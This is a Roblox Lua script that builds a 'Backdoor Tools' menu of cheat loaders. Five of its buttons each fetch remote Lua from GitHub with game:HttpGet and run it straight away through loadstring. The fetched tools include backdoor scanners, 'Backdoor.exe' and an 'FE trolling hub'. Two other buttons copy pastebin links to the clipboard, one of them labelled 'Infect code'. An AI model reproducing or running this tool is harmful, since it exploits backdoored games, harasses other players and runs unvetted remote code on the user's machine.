-- Create the ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "BackdoorTools"
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

-- Create the main frame
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 300, 0, 400)
mainFrame.Position = UDim2.new(0.5, -150, 0.5, -200)
mainFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
mainFrame.Visible = false
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Parent = screenGui

-- Create the toggle button
local toggleButton = Instance.new("TextButton")
toggleButton.Size = UDim2.new(0, 100, 0, 50)
toggleButton.Position = UDim2.new(0.5, -50, 0, 20)
toggleButton.Text = "Toggle GUI"
toggleButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
toggleButton.Active = true
toggleButton.Draggable = true
toggleButton.Parent = screenGui

-- Create a label to display the GUI name
local nameLabel = Instance.new("TextLabel")
nameLabel.Size = UDim2.new(0, 200, 0, 50)
nameLabel.Position = UDim2.new(0.5, -100, 0, 0)
nameLabel.Text = "Backdoor Tools {2024}"
nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
nameLabel.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
nameLabel.Parent = mainFrame

-- Function to toggle the GUI visibility
toggleButton.MouseButton1Click:Connect(function()
    mainFrame.Visible = not mainFrame.Visible
end)

-- Button names and scripts
local buttonData = {
    {name = "LALOL hub", script = "loadstring(game:HttpGet('https://raw.githubusercontent.com/Its-LALOL/LALOL-Hub/main/Backdoor-Scanner/script'))()"},
    {name = "LALOL hub <no hint>", script = "loadstring(game:HttpGet('https://raw.githubusercontent.com/Obunga-666/Lalol-hub-without-hint/refs/heads/main/Lalol%20hub%20without%20hint'))()"},
    {name = "Backdoor.exe v6x", script = "loadstring(game:HttpGet('https://raw.githubusercontent.com/iK4oS/backdoor.exe/v6x/source.lua'))()"},
    {name = "Backdoor legacy", script = "loadstring(game:HttpGet('https://raw.githubusercontent.com/IvanTheProtogen/BackdoorLegacy/main/main.lua'))()"},
    {name = "ExSer (Website & safe & free)", script = "setclipboard('https://pastebin.com/raw/DW23wZkM <Open this link for ExSer tutorial>')"},
    {name = "Fe trolling hub", script = "loadstring(game:HttpGet('https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/FE%20Trolling%20GUI.luau'))()"},
    {name = "Infect code <for backdoor>", script = "setclipboard('https://pastebin.com/raw/ZJVgmnvm <Open this link for infect code>')"}
}

-- Create the buttons inside the main frame
for i, data in ipairs(buttonData) do
    local button = Instance.new("TextButton")
    button.Size = UDim2.new(0, 200, 0, 40)  -- Adjusted size to fit all buttons
    button.Position = UDim2.new(0.5, -100, 0, 50 * (i - 1) + 60)  -- Adjusted position
    button.Text = data.name
    button.BackgroundColor3 = Color3.fromRGB(150, 150, 150)
    button.Parent = mainFrame

    -- Function to execute the script when the button is clicked
    button.MouseButton1Click:Connect(function()
        loadstring(data.script)()
    end)
end

